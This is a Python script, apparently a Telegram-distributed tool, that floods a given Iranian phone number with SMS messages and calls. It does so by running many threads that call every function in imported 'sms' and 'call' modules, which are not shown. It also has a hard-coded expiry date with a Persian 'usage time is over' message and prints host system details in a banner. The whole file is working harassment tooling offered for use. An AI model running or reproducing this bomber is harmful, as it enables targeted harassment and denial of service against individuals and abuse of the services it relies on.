from platform import node, system, release; Node, System, Release = node(), system(), release() 
from time import sleep
from os import system
from threading import Thread
from Api import sms, call
from time import sleep
from inspect import getmembers, isfunction 
from os import system, name
import random
import datetime
import sys

now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 8, 12, 00, 00 ,0)
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'\n\n زمان استفاده از فایل تموم شده\n\n    ')
 print('\n\n')
 print(x)
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'\n\n زمان استفاده از فایل تموم شده\n\n    ')
    print('\n\n')
    print(x)
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')

W='\033[0m'
colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']

R='\033[1;31m'
G='\033[32;1m' 
Y='\033[1;33m'
W='\033[1;37m'

class color :
    Purple = '\033[95m'
    RED = '\033[91m'
    wormy = '\033[93m'
def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(0.01)
printLow(f'''
{R}****************************
{W}*                Hello Dear             *
{W}*                                                *
{G}****************************
''') 
sleep(4)
system('clear')
SMS_SERVICES = list(i[0] for i in getmembers(sms, isfunction))
CALL_SERVICES = list(i[0] for i in getmembers(call, isfunction))
r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'

printLow(f'''{r}++++++++++++++++++++++++++++
{w} Telegram : Z0roday ++
{g} +++++++++++++++++++++++++

{y}Info:
    {g}[+] {y}: {w}@Zeroday
    
{y}system:
    {g}[+] {y}Platform: {w}{System}
    {g}[+] {y}Node: {w}{Node}
    {g}[+] {y}Release: {w}{Release}
    
''')

def bombing(phone, count):
    x = 0
    phone = f"+98{phone[1:]}"
    for j in range(count):
        for k in range(len(SMS_SERVICES)):
            Thread(target=getattr(sms, SMS_SERVICES[k]), args=[phone]).start()
        if (j !=0) and (j % 5) == 0:
            Thread(target=getattr(call, CALL_SERVICES[x]), args=[phone]).start()
            x += 1
            if x > len(CALL_SERVICES) - 1:
            	x = 0
        print(f"Round {j+1} Completed Gg")
        sleep(0.2)
    printLow("Finish")
while True:    
    if __name__ == "__main__":
        num = input(f'{g}[?] {y}Enter Phone Number {g}(099××××××) {r}- {w}')
        if num == '':
             continue
        yy = int(input("enter of number: "))
        system('clear' if name == 'posix' else 'cls')
        printLow("*Phone Number:{}\n*Rounds: {}\n\n".format(num,yy))
        printLow("Start\n")
        bombing(phone=num,count=yy)
